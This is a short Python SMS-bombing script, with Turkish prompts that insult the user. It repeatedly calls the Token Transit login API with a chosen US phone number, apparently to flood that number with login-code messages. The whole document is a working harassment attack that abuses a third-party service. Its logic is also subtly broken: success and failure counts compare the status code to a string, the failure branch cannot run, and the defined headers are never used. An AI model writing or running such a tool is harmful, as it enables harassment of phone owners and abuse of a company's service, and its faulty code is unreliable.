import os
import time
import requests
from tqdm import tqdm
banner = ("""
Phone Spammer For Usa

""")
print(banner)
headers = ({'User-Agent':
        'Token Transit/4.2.4 (Android 9; sdk 28; gzip) okhttp'})
tel = input('Telefon numarası +1 siz yaz aptal :')
tel = str(tel)
api = "https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20"+tel
kaçtane=int(input('Kaç tane olsun lan Allahsız :'))
basarılı=0
basarısız=0
for i in tqdm(range(kaçtane)):
    resp = requests.get(api)
    if resp.status_code == "200":
        basarılı = basarılı +1
        if resp.status_code != "200":
            basarısız = basarısız +1
print("Toplam gönderilen :", basarılı)
print("Gönderilemeyen",basarısız)
